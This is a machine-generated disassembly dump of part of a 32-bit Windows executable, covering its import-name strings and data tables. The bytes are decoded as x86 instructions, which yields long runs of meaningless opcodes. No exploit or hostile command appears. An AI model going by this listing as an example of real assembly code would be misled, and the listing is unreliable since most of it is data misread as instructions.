  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	xor    eax,0x68720043
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf6
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    BYTE PTR [ebx+0x0],al
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
